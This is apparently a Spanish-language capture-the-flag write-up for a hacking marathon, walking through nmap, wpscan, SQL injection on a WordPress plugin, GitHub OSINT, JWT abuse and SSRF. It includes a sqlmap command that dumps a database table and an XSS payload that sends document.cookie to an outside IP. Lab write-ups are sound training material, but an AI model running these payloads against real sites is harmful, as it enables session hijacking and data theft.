# hackton
Soluciones de la maraton de hacking
Participantes:

DeepHack
D3vil2Gh0st

Se realiza un escaneo con la herramienta NMAP para descubrir los puertos que la máquina objetiva tenga abierto. 



Para esta ocasión nos fijamos en los puertos 80 y 443, que son servidores Webs y pueden tener muchas vulnerabilidades críticas. 














FLAG{Update_Plugins!}

Lo primero que se busca en un servidor web, es un archivo llamado robots.txt el cual suele tener mucha información.


En esta ocasión nos muestra un nombre de servidor diferente al que trae la máquina. 
Con la herramienta wpscan analizamos la dirección ip que está compuesta por un wordpress para averiguar los plugins que esta tiene.
En ella se descubre el plugin perfect-survey, gracias a este plugin se ha podido inyectar código SQL 

Programa y comando usados:

sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --dump -D flag -T flag

OSINT

FLAG{ALWAYS_CHECK_COMMITS}

Accedemos al apartado https://github.com/geohome-dev y revisamos el contenido. Entramos en GeoAPI y vemos la siguiente entrada:



{“Flag”:”API_FLAG{Never_public_your_secret}

Posteriormente trataremos de usar el metodo POST para poder realizar el registro de un usuario. La idea es conseguir un Web TOKEN.

Seguimos haciendo una revisión de los contenidos, y observamos algunos commits subidos. Trás una revisión obtenemos la flag.



Haciendo uso de Postman, vamos a tratar de generar un archivo con formato Json para pasarle el data de forma adecuada. La URL que usaremos 192.168.58.136:5000/register.


Obtenemos un login satisfactorio, así que vamos a pasar al apartado de /login para ver si nos reporta el TOKEN.



curl http://wp.geohome.com:5000/admin -H “Authorization: Bearer TOKEN”

















FLAG{SANITIZE_INPUT}




<script>var x=new Image; x.src="http://192.168.1.47/?"+document.cookie;</script>



FLAG{SSRF_PARA_TOD@S_XD}


Hacemos recorrido de directorios para ver si encontramos algo adicional, y localizamos el directorio testsite.



Se modifica en el input la función action con el propio archivo testsite para así poder abrir cualquier dirección URL que se le introduzca, al ver que lo hacía, se escribe la dirección local, al ver que está saneada, se utiliza la técnica de bypass para vulnerar el saneamiento y así poder ver la flag.


